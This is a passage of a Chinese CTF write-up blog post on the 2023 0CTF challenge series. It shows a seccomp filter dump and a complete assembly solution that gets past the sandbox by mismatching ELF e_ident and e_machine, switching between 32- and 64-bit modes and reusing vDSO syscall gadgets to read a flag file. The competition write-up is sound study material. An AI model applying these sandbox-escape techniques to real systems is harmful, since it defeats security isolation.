class="hljs-number">0011</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000024</span>  A = prot &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># mmap(addr, len, prot, flags, fd, pgoff)</span><br> <span class="hljs-number">0012</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x1a</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0013</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000020</span>  A = prot <span class="hljs-meta"># mmap(addr, len, prot, flags, fd, pgoff)</span><br> <span class="hljs-number">0014</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x17</span> <span class="hljs-number">0x18</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x2</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0015</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A != execve) <span class="hljs-keyword">goto</span> <span class="hljs-number">0020</span><br> <span class="hljs-number">0016</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># execve(filename, argv, envp)</span><br> <span class="hljs-number">0017</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x15</span> <span class="hljs-number">0x00007ffd</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x7ffd</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0018</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># execve(filename, argv, envp)</span><br> <span class="hljs-number">0019</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x12</span> <span class="hljs-number">0x13</span> <span class="hljs-number">0x20088750</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x20088750</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0020</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x12</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A != open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0021</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000014</span>  A = filename &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0022</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x10</span> <span class="hljs-number">0x00000013</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x13</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0023</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000010</span>  A = filename <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0024</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0e</span> <span class="hljs-number">0x37331337</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x37331337</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0025</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000001c</span>  A = flags &gt;&gt; <span class="hljs-number">32</span> <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0026</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0c</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0027</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000018</span>  A = flags <span class="hljs-meta"># open(filename, flags, mode)</span><br> <span class="hljs-number">0028</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x0a</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == <span class="hljs-number">0x0</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span> <span class="hljs-keyword">else</span> <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0029</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x09</span> <span class="hljs-number">0x40000003</span>  <span class="hljs-keyword">if</span> (A != ARCH_I386) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0030</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0031</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A == write) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0032</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x05</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == close) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0033</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x04</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  <span class="hljs-keyword">if</span> (A == stat) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0034</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000002d</span>  <span class="hljs-keyword">if</span> (A == recvfrom) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0035</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000005a</span>  <span class="hljs-keyword">if</span> (A == chmod) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0036</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000005b</span>  <span class="hljs-keyword">if</span> (A == fchmod) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0037</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x000000fc</span>  <span class="hljs-keyword">if</span> (A != ioprio_get) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0038</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br> <span class="hljs-number">0039</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></table></figure>
+
+<p>open的filename要求的地址变了</p>
+<h3 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h3><p>wrapper.py判断32位是用的e_ident，但Linux运行时使用e_machine判断是32位还是64位，所以编一个64位的程序改一下e_ident就行，但这样gdb调不了IDA也反编译不了：）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs assembly">global      _start<br>section     .text exec<br>BITS 32<br><br>    ; align 0x1000<br>vdso_landing:<br>; sysenter will use sysexit to return to some place in vsdo<br>; because is in 32bit, high 32bit will be clear<br>; we setup a soft landing place at the start of elf<br>; then mmap elf to vdso address<br>    times 4096 db 0x90      ; nop padding<br>    pop     ebp<br>    pop     edx<br>    pop     ecx<br>    ret<br><br>    ; lea     esp, [stack]<br>    ; mov     esp, stack<br><br>retf_to_64:<br>    push    0x33            ; cs<br>    push    edi             ; ip<br>    retf                    ; jump to edi (64bit)<br><br>_sysenter:<br>    push    ecx             ; push   ecx<br>    push    edx             ; push   edx<br>    push    ebp             ; push   ebp<br>    mov     ebp, esp<br>    sysenter<br><br>start_32:<br>mmap_elf_to_vdso:<br>    push    0x1000          ; off: 0x1000 : .text start<br>    push    4               ; fd: 4, elf file<br>    push    0x11            ; flags: MAP_FIXED | MAP_SHARED<br>    push    5               ; prot: RX<br>    push    0x4000          ; length: elf size<br>    push    edx             ; addr: vdso return addr &amp;&amp; elf base<br>    mov     ebx, esp<br>    mov     eax, 0x5a       ; mmap<br>    call    _sysenter<br>read_flag:<br>    mov     eax, 3          ; SYS_read (32bit)<br>    mov     ebx, 3          ; fd: flag<br>    mov     ecx, pad    	; buf<br>    mov     edx, 0x1000     ; count<br>    call    _sysenter<br>write_flag_to_stdout:<br>	mov     edx, eax        ; count<br>    mov     eax, 4          ; SYS_write (32bit)<br>    mov     ebx, 1          ; fd: STDOUT<br>    mov     ecx, pad    	; buf<br>    call    _sysenter<br>exit_137:<br>    mov     eax, 1          ; SYS_exit (32bit)<br>    mov     ebx, 137        ; error_code<br>    call    _sysenter<br><br>BITS 64<br><br>; copy string at rsi to rdi, no return value<br>strcpy:<br>    cld<br>cpy1:<br>    lodsb<br>    stosb<br>    test al,al<br>    jne cpy1<br>    ret<br><br>retf_to_32:<br>; switch to 32 bit<br>    push    0x23            ; cs<br>    push    rdi             ; ip<br>    retfq                   ; jump to rdi<br><br>_start:<br>find_elf_name:<br>    mov     r13, [rsp+8] ; argv[0]<br><br>; find vdso address on stack<br>    mov rdi, rsp<br>find_vdso_l1:<br>    cmp     QWORD [rdi],0x21<br>    je      find_vdso_l2<br>    add     rdi,0x8<br>    jmp     find_vdso_l1<br>find_vdso_l2: <br>    mov     r15, QWORD [rdi+0x8] ; r15 store vdso address, will be page aligned<br>    mov     rax, r15<br>; search for `syscall; ret` in vdso<br>find_syscall_ret_l1:<br>    cmp    BYTE [rax],0xf<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x1],0x5<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x2],0x31<br>    je     find_syscall_ret_l3<br>find_syscall_ret_l2:<br>    inc    rax<br>    jmp    find_syscall_ret_l1<br>find_syscall_ret_l3:<br>    mov     r14, rax            ; r14: syscall; ret<br><br><br>mmap_flag:<br>    mov 	rax, 0x9<br>    mov 	rdi, 0x1337331337<br>    mov 	rsi, 0x1000<br>    mov 	rdx, 2<br>    mov 	r10, 0x22<br>    mov 	r8, 0<br>    mov 	r9, 0<br>    call 	r14 ; call syscall<br>open_flag:<br>    mov     rdi, 0x1337331337    ; ld script will ensure 0x31337 is mapped and RW<br>    lea     rsi, [flag]<br>    call    strcpy<br>    <br>    mov     rdi, 0x1337331337<br>    xor     rsi, rsi<br>    mov     eax, 2<br>    call    r14             ; open(&quot;flag&quot;, 0) -&gt; fd 3<br><br>open_elf:<br>    mov     rdi, 0x1337331337    ; ld script will ensure 0x31337 is mapped and RW<br>    mov     rsi, r13<br>    call    strcpy<br>    <br>    mov     rdi, 0x1337331337<br>    xor     rsi, rsi<br>    mov     eax, 2<br>    call    r14             ; open(&quot;ELF_FILE&quot;, 0) -&gt; fd 4<br>; enter 32 bit<br>    mov     edx, r15d ; clear high 32 bit vdso addr<br>    mov     rsp, stack<br>    mov     rdi, start_32<br>    call    retf_to_32<br><br>flag:       db          &quot;flag&quot;, 0<br>message:    db          &quot;test output!!!!!&quot;, 0<br>sc:         db          0x90, 0x90<br>sc_len:     dq          2<br>section     .bss noexec<br>    align 16<br>pad:        resb        0x1000<br>stack:      resb        0x1000<br></code></pre></td></tr></table></figure>
+
+<p>filename地址直接mmap了</p>
+<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul>
+<li>栈上有什么东西（envp，auxv……），链接装载与库，乐</li>
+<li>程序启动，执行程序的内存映射和权限控制什么的</li>
+<li>系统调用（有点忘了用户态和内核态切换的过程了(ˉ▽ˉ；)…）</li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/WP/" class="category-chain-item">WP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023 0CTF 无中生有系列</div>
+      <div>http://akaieurus.github.io/2024/01/21/有即是无无即是有/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月21日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/25/2023%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9Bpwnwp/" title="2023 强网杯线上赛 pwn wp">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2023 强网杯线上赛 pwn wp</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/12/CVE-2022-0847-DirtyPipe/" title="CVE-2022-0847 DirtyPipe">
+                        <span class="hidden-mobile">CVE-2022-0847 DirtyPipe</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
